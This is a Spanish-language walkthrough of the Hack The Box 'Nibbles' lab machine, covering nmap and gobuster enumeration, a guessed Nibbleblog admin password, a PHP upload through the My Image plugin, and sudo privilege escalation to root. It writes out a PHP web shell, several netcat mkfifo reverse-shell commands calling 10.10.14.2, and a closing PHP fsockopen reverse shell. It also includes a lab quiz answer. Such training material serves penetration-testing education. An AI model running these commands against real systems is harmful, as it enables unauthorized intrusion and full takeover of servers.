Nuestro primer paso al abordar cualquier máquina es realizar una enumeración básica. Primero, comencemos con lo que sabemos sobre el objetivo. Ya conocemos la dirección IP del objetivo, que es Linux y que tiene un vector de ataque relacionado con la web. A esto lo llamamos un enfoque de caja gris porque tenemos algo de información sobre el objetivo. En la plataforma de HTB, las 20 máquinas "activas" de lanzamiento semanal se abordan desde una perspectiva de caja negra. A los usuarios se les proporciona la dirección IP y el tipo de sistema operativo de antemano, pero no se les da información adicional sobre el objetivo para formular sus ataques. Es por eso que la enumeración exhaustiva es fundamental y a menudo es un proceso iterativo.

**Antes de continuar, tomemos un momento para revisar los diferentes enfoques de las pruebas de penetración. Existen tres tipos principales: caja negra, caja gris y caja blanca, y cada uno difiere en el objetivo y el enfoque.**

| **Enfoque**     | **Descripción**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Caja Negra**  | Poco o ningún conocimiento del objetivo. El probador de penetración debe realizar un reconocimiento detallado para aprender sobre el objetivo. Esto puede ser una prueba de penetración externa donde al probador solo se le proporciona el nombre de la empresa y ninguna información adicional como direcciones IP del objetivo, o una prueba interna donde el probador debe evadir controles para obtener acceso inicial a la red o puede conectarse a la red interna pero sin información sobre redes/hosts internos. Este tipo de prueba simula un ataque real, pero no es tan exhaustiva como otros tipos de evaluación y podría dejar vulnerabilidades sin descubrir. |
| **Caja Gris**   | En una prueba de caja gris, al probador se le proporciona una cierta cantidad de información por adelantado. Esto puede ser una lista de direcciones IP dentro del alcance, credenciales de bajo nivel para una aplicación web o Active Directory, o algunos diagramas de aplicaciones/redes. Este tipo de prueba puede simular a un atacante interno malintencionado o ver lo que un atacante puede hacer con un bajo nivel de acceso. En este escenario, el probador normalmente pasa menos tiempo en el reconocimiento y más tiempo buscando configuraciones erróneas e intentando explotar vulnerabilidades.                                                             |
| **Caja Blanca** | En este tipo de prueba, el probador tiene acceso completo. En una prueba de aplicación web, se le pueden proporcionar credenciales de nivel administrador, acceso al código fuente, diagramas de construcción, etc., para buscar vulnerabilidades lógicas y otros fallos difíciles de descubrir. En una prueba de red, se le pueden dar credenciales de administrador para investigar Active Directory u otros sistemas en busca de configuraciones erróneas que de otro modo pasarían desapercibidas. Este tipo de evaluación es altamente exhaustiva, ya que el probador tendrá acceso a ambos lados del objetivo y realizará un análisis integral.                        |
**Nmap**

Comencemos con un escaneo rápido usando **nmap** para buscar puertos abiertos, utilizando el comando `nmap -sV --open -oA nibbles_initial_scan <dirección IP>`. Esto ejecutará una enumeración de servicios (-sV) contra los 1,000 puertos predeterminados y solo devolverá puertos abiertos (--open). Podemos verificar qué puertos escanea **nmap** para un tipo de escaneo específico ejecutando un escaneo sin un objetivo especificado, usando el comando `nmap -v -oG -`. Aquí, se enviará el formato greppable a stdout con `-oG -` y `-v` para la salida detallada. Dado que no se especifica un objetivo, el escaneo fallará pero mostrará los puertos escaneados.

**Nibbles - Enumeración**
`pista95@htb[/htb]$ nmap -v -oG -  # Nmap 7.80 scan initiated Wed Dec 16 23:22:26 2020 as: nmap -v -oG -  # Puertos escaneados: TCP(1000; 1,3-4,6-7,9,13,17,19-26,30,32-33,...)  WARNING: No se especificaron objetivos, por lo que 0 hosts fueron escaneados.  # Nmap done at Wed Dec 16 23:22:26 2020 -- 0 direcciones IP (0 hosts up) escaneados en 0.04 segundos`

Finalmente, generaremos todos los formatos de salida usando `-oA`. Esto incluye salida en XML, formato greppable y texto, que nos puede ser útil más adelante. Es esencial acostumbrarnos a tomar notas detalladas y guardar toda la salida de la consola desde el principio. Cuanto mejor lo hagamos mientras practicamos, más natural será en evaluaciones reales. Tomar notas adecuadas es fundamental para nosotros como pentesters, ya que acelera el proceso de informes y asegura que no se pierda ninguna evidencia. Además, es crucial mantener registros detallados con marcas de tiempo de los intentos de escaneo y explotación, en caso de que el cliente necesite información sobre nuestras actividades.

**Nibbles - Enumeración**

`pista95@htb[/htb]$ nmap -sV --open -oA nibbles_initial_scan 10.129.42.190  Starting Nmap 7.80 (https://nmap.org) at 2020-12-16 23:18 EST  Informe de escaneo de Nmap para 10.129.42.190 Host está activo (0.11s de latencia). No se muestran: 991 puertos cerrados, 7 puertos filtrados Algunos puertos cerrados pueden reportarse como filtrados debido a --defeat-rst-ratelimit PUERTO    ESTADO SERVICIO VERSIÓN 22/tcp    open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocolo 2.0) 80/tcp    open   http    Apache httpd <REDACTED> (Ubuntu) Información del servicio: SO: Linux; CPE: cpe:/o:linux:linux_kernel  Detección de servicio completada. Por favor, reporta cualquier resultado incorrecto en https://nmap.org/submit/. Nmap hecho: 1 dirección IP (1 host activo) escaneada en 11.82 segundos`

A partir de la salida del escaneo inicial, podemos ver que el host probablemente es **Ubuntu Linux** y expone un servidor web **Apache** en el puerto 80 y un servidor **OpenSSH** en el puerto 22. **SSH**, o Secure Shell, es un protocolo típicamente utilizado para el acceso remoto a hosts Linux/Unix. **SSH** también puede utilizarse para acceder a hosts **Windows** y es nativo en **Windows 10** desde la versión 1809. También podemos ver que los tres tipos de salida de escaneo fueron creados en nuestro directorio de trabajo.

**Nibbles - Enumeración**
`pista95@htb[/htb]$ ls  nibbles_initial_scan.gnmap  nibbles_initial_scan.nmap  nibbles_initial_scan.xml`

Antes de empezar a explorar los puertos abiertos, podemos ejecutar un escaneo completo de puertos TCP con el comando `nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190`. Esto buscará cualquier servicio que esté funcionando en puertos no estándar que nuestro escaneo inicial pudo haber pasado por alto. Dado que este comando escanea los 65,535 puertos TCP, puede tardar mucho en completarse dependiendo de la red. Podemos dejarlo ejecutándose en segundo plano y continuar con nuestra enumeración. Usar `nc` para hacer una captura de banner confirma lo que `nmap` nos dijo; el objetivo está ejecutando un servidor web Apache y un servidor OpenSSH.

### Nibbles - Enumeración

`pista95@htb[/htb]$ nc -nv 10.129.42.190 22 (UNKNOWN) [10.129.42.190] 22 (ssh) open SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8`

`nc` nos dice que el puerto 80 ejecuta un servidor HTTP (web), pero no muestra el banner.

`pista95@htb[/htb]$ nc -nv 10.129.42.190 80 (UNKNOWN) [10.129.42.190] 80 (http) open`

Verificando nuestra otra ventana de terminal, vemos que el escaneo completo de puertos (-p-) ha terminado y no ha encontrado puertos adicionales. Vamos a realizar un escaneo de scripts de `nmap` usando la opción `-sC`. Esta opción utiliza los scripts por defecto, que están listados aquí. Estos scripts pueden ser intrusivos, por lo que siempre es importante entender exactamente cómo funcionan nuestras herramientas. Ejecutamos el comando `nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190`. Ya que sabemos qué puertos están abiertos, podemos ahorrar tiempo y reducir el tráfico innecesario del escáner especificando los puertos objetivo con `-p`.

### Nibbles - Enumeración

`pista95@htb[/htb]$ nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190`

Salida:

`Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:39 EST Nmap scan report for 10.129.42.190 Host is up (0.11s latency).  PORT   STATE SERVICE 22/tcp open  ssh | ssh-hostkey:  |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open  http |_http-title: Site doesn't have a title (text/html).  Nmap done: 1 IP address (1 host up) scanned in 4.42 seconds`

El escaneo de scripts no nos dio ninguna información útil. Vamos a completar nuestra enumeración con `nmap` usando el script `http-enum`, que se puede utilizar para enumerar directorios comunes de aplicaciones web. Este escaneo tampoco reveló nada útil.

### Nibbles - Enumeración

`pista95@htb[/htb]$ nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190`

Salida:

`Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST Nmap scan report for 10.129.42.190 Host is up (0.11s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu)) |_http-server-header: Apache/<REDACTED> (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds`

#### Questions

Answer the question(s) below 

 Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)
 2.4.18

# Nibbles - Web Footprinting

Podemos usar **whatweb** para intentar identificar la aplicación web en uso.

`Nibbles - Web Footprinting pista95@htb[/htb]$ whatweb 10.129.42.190`


`http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]`

Esta herramienta no identifica ninguna tecnología web estándar en uso. Al navegar al objetivo en Firefox, vemos un simple mensaje de "Hello world!". Al revisar el código fuente de la página, encontramos un comentario interesante. También podemos verificar esto con cURL.


`Nibbles - Web Footprinting pista95@htb[/htb]$ curl http://10.129.42.190`


`<b>Hello world!</b> <!-- /nibbleblog/ directory. Nothing interesting here! -->`

El comentario HTML menciona un directorio llamado **nibbleblog**. Vamos a verificarlo con **whatweb**.

`Nibbles - Web Footprinting pista95@htb[/htb]$ whatweb http://10.129.42.190/nibbleblog`

`http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], RedirectLocation[http://10.129.42.190/nibbleblog/] http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog]`

Ahora comenzamos a tener una mejor idea de las tecnologías en uso, como **HTML5**, **jQuery** y **PHP**, y confirmamos que el sitio usa **Nibbleblog**, un motor de blogs gratuito construido en PHP.

### Enumeración de Directorios

Al navegar al directorio `/nibbleblog`, no encontramos nada interesante en la página principal. Una búsqueda rápida en Google de **"nibbleblog exploit"** muestra una vulnerabilidad de carga de archivos en **Nibbleblog** que permite a un atacante autenticado cargar y ejecutar código PHP arbitrario en el servidor. El módulo de **Metasploit** que explota esta vulnerabilidad es para la versión **4.0.3**. No sabemos la versión exacta aún, pero es probable que sea vulnerable.

Usamos **Gobuster** para buscar otros directorios accesibles.


`Nibbles - Web Footprinting pista95@htb[/htb]$ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt`


`/admin.php (Status: 200) /README (Status: 200)`

Gobuster confirma la presencia de la página **admin.php**. Podemos revisar la página **README** para obtener más información, como el número de versión.

`Nibbles - Web Footprinting pista95@htb[/htb]$ curl http://10.129.42.190/nibbleblog/README`


`====== Nibbleblog ====== Version: v4.0.3`

Validamos que la versión en uso es la **4.0.3**, lo que confirma la vulnerabilidad. Sin embargo, para usar este exploit necesitamos credenciales válidas de administrador.

### Exploración del Portal de Administración

Probamos combinaciones comunes de credenciales como **admin**, pero no funcionaron. También descubrimos que, después de varios intentos fallidos de inicio de sesión, se nos bloquea por un mecanismo de seguridad que **lista negra** nuestra IP.

Al explorar más directorios, encontramos un archivo **users.xml** que confirma que el nombre de usuario es **admin**.


`Nibbles - Web Footprinting pista95@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -`

A pesar de tener un nombre de usuario válido, aún no tenemos la contraseña. Finalmente, encontramos un archivo **config.xml**, pero sin información útil para la contraseña. Sin embargo, considerando que el nombre de la máquina es **Nibbles**, podríamos probar este nombre como contraseña.

### Conclusión

Hasta ahora, hemos logrado:

1. Identificar que el sitio usa **Nibbleblog**.
2. Encontrar el portal de administración.
3. Confirmar que el nombre de usuario es **admin**.
4. Deducir que la contraseña es probablemente **nibbles**.

Este proceso demuestra la importancia de la enumeración exhaustiva y de mantener un proceso claro y repetible durante las pruebas de penetración.

**Nibbles - Acceso Inicial**

Ahora que hemos iniciado sesión en el portal de administración, necesitamos intentar convertir este acceso en ejecución de código y, finalmente, obtener acceso de shell inverso al servidor web. Sabemos que es probable que un módulo de Metasploit funcione para esto, pero primero enumeremos el portal de administración para encontrar otras posibles vías de ataque. Al explorar un poco, vemos las siguientes páginas:

|**Página**|**Contenido**|
|---|---|
|**Publish**|Permite crear una nueva publicación, una publicación de video, una cita o una nueva página. Podría ser interesante.|
|**Comments**|Muestra que no hay comentarios publicados.|
|**Manage**|Nos permite gestionar publicaciones, páginas y categorías. Podemos editar y eliminar categorías, pero no es muy interesante.|
|**Settings**|Al desplazarnos hacia abajo confirmamos que se está utilizando la versión vulnerable 4.0.3. Hay varias configuraciones disponibles, pero ninguna parece valiosa para nosotros.|
|**Themes**|Nos permite instalar un nuevo tema de una lista preseleccionada.|
|**Plugins**|Nos permite configurar, instalar o desinstalar plugins. El plugin "My image" nos permite subir un archivo de imagen. ¿Podríamos abusar de esto para cargar potencialmente código PHP?|

Intentar crear una nueva página e insertar código o subir archivos no parece ser el camino. Vamos a revisar la página de plugins.

`http://10.129.42.190/nibbleblog/admin.php?controller=plugins&action=list`

Intentemos usar este plugin para cargar un fragmento de código PHP en lugar de una imagen. El siguiente fragmento puede utilizarse para probar la ejecución de código.

`<?php system('id'); ?>`

Guarda este código en un archivo, luego haz clic en el botón "Browse" y súbelo.

`http://10.129.42.190/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image`

Recibimos varios errores, pero parece que el archivo podría haberse subido.

**Nibbles - Acceso Inicial**

`Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26  Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27  Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117  Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118  Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43  Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80`

Ahora tenemos que averiguar dónde se subió el archivo si fue exitoso. Volviendo a los resultados de la fuerza bruta de directorios, recordamos el directorio `/content`. Bajo este, hay un directorio `plugins` y otro subdirectorio llamado `my_image`. La ruta completa es `http://<host>/nibbleblog/content/private/plugins/my_image/`. En este directorio, vemos dos archivos: `db.xml` y `image.php`, con una fecha de modificación reciente, ¡lo que significa que nuestra carga fue exitosa! Verifiquemos si tenemos ejecución de comandos.

**Nibbles - Acceso Inicial**

`pista95@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php  uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)`

¡Lo logramos! Parece que hemos obtenido ejecución remota de código en el servidor web, y el servidor Apache está ejecutándose en el contexto del usuario `nibbler`. Modifiquemos nuestro archivo PHP para obtener un shell inverso y empezar a explorar el servidor.

Editemos nuestro archivo PHP local y volvamos a subirlo. Este comando debería proporcionarnos un shell inverso. Como se mencionó anteriormente en el módulo, existen muchas guías de shell inverso. Algunas excelentes son las de **PayloadAllTheThings** y **HighOn.Coffee**.

Utilicemos el siguiente comando de shell inverso en Bash y añadámoslo a nuestro script PHP.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ATACANTE> <PUERTO_ESCUCHA> >/tmp/f`

Sustituiremos `<IP_ATACANTE>` por la dirección IP de nuestra VPN tun0, y un puerto de nuestra elección para `<PUERTO_ESCUCHA>` para capturar el shell inverso en nuestro listener de netcat. A continuación, el script PHP editado:

`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>`

Subimos el archivo nuevamente y comenzamos un listener de netcat en nuestra terminal:

**Nibbles - Acceso Inicial**

`0xdf@htb[/htb]$ nc -lvnp 9443  listening on [any] 9443 ...`

Luego, realiza un `curl` a la página de la imagen nuevamente o navega a ella en Firefox: `http://nibbleblog/content/private/plugins/my_image/image.php` para ejecutar el shell inverso.

**Nibbles - Acceso Inicial**

`pista95@htb[/htb]$ nc -lvnp 9443  listening on [any] 9443 ... connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106 /bin/sh: 0: can't access tty; job control turned off $ id  uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)`

Tenemos un shell inverso. Antes de seguir con más enumeración, actualicemos nuestro shell a uno "más amigable", ya que el que capturamos no es completamente interactivo (no podemos usar `su`, editores de texto, completado de tabulaciones, etc.). Este post explica el problema y varias formas de actualizar a un TTY interactivo. Para nuestro propósito, utilizaremos un comando de Python para generar un pseudo-terminal.

`python -c 'import pty; pty.spawn("/bin/bash")'`

Prueba las diferentes técnicas para actualizar a un TTY completo y elige la que mejor te funcione. Nuestro primer intento falla ya que Python2 parece faltar en el sistema.

**Nibbles - Acceso Inicial**


`$ python -c 'import pty; pty.spawn("/bin/bash")'  /bin/sh: 3: python: not found`

Sin embargo, tenemos Python3, que funciona para obtener un shell más amigable con el comando `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Al explorar `/home/nibbler`, encontramos el archivo `user.txt` y un archivo comprimido `personal.zip`.

**Nibbles - Acceso Inicial**

`nibbler@Nibbles:/home/nibbler$ls personal.zip  user.txt`

# Nibbles - Privilege Escalation

Ahora que tenemos una conexión de shell inverso, es momento de escalar privilegios. Podemos descomprimir el archivo `personal.zip` y ver un archivo llamado `monitor.sh`.


`nibbler@Nibbles:/home/nibbler$ unzip personal.zip  Archive:  personal.zip    creating: personal/    creating: personal/stuff/   inflating: personal/stuff/monitor.sh` 

El script `monitor.sh` es un script de monitoreo, y está bajo la propiedad de nuestro usuario `nibbler` y es editable.


`nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh  ####################################################################################################  #                                        Tecmint_monitor.sh                                        #  # Escrito para Tecmint.com para el artículo www.tecmint.com/linux-server-health-monitoring-script/ #  # Si encuentras algún error, repórtalo en el enlace de abajo.                                      #  # Uso libre/edición/distribución del código abajo, dando el crédito adecuado a Tecmint.com y el autor #  ####################################################################################################  #! /bin/bash  # unset cualquier variable que el sistema pueda estar usando  # limpiar la pantalla  clear  unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage  while getopts iv name do        case $name in          i)iopt=1;;          v)vopt=1;;          *)echo "Invalid arg";;        esac done  <SNIP>`

Pongamos esto a un lado por ahora y usemos `LinEnum.sh` para realizar algunas verificaciones automáticas de escalación de privilegios. Primero, descarga el script a tu VM de ataque o a la Pwnbox y luego inicia un servidor HTTP de Python usando el comando `sudo python3 -m http.server 8080`.


`pista95@htb[/htb]$ sudo python3 -m http.server 8080 [sudo] password for ben: ***********  Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ... 10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -`

En el objetivo, escribe `wget http://<tu ip>:8080/LinEnum.sh` para descargar el script. Si es exitoso, veremos una respuesta 200 en nuestro servidor HTTP de Python. Una vez descargado el script, escribe `chmod +x LinEnum.sh` para hacerlo ejecutable y luego `./LinEnum.sh` para ejecutarlo. Vemos muchos resultados interesantes, pero lo que más llama la atención son los privilegios `sudo`.


`[+] ¡Podemos usar sudo sin proporcionar una contraseña! Matching Defaults entries for nibbler on Nibbles:     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  User nibbler may run the following commands on Nibbles:     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh`

¡Posible escalación con sudo! El usuario `nibbler` puede ejecutar el archivo `/home/nibbler/personal/stuff/monitor.sh` con privilegios de root. Como tenemos control total sobre ese archivo, si añadimos una línea de código para un shell inverso al final del archivo y lo ejecutamos con `sudo`, deberíamos obtener un shell inverso como usuario root. Editemos el archivo `monitor.sh` para añadir un shell inverso.

`nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh`

Si hacemos `cat` al archivo `monitor.sh`, veremos el contenido añadido al final. Es crucial que, si alguna vez nos encontramos en una situación donde podemos aprovechar un archivo editable para escalar privilegios, solo añadamos al final (después de hacer una copia de seguridad) para evitar sobrescribir el archivo y causar interrupciones. Ejecuta el script con `sudo`:

`nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh`

Finalmente, captura el shell de root en nuestro listener de `nc` esperando.


`pista95@htb[/htb]$ nc -lvnp 8443  listening on [any] 8443 ... connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488 # id  uid=0(root) gid=0(root) groups=0(root)`

Desde aquí, podemos obtener la flag `root.txt`. Finalmente, hemos resuelto nuestra primera máquina en HTB. Intenta replicar todos los pasos por tu cuenta y usa diferentes herramientas para lograr el mismo efecto. Hay muchas herramientas que podemos usar en los distintos pasos necesarios para resolver esta máquina. Esta guía muestra un método posible. Asegúrate de tomar notas detalladas para practicar esa habilidad crucial.

Laboratoriocd 


Ganando acceso a root ya que contamos con permisos sudo en el binario php:
sudo /usr/bin/php -r '$sock=fsockopen("10.10.15.220",8888);exec("/bin/bash -i <&3 >&3 2>&3");'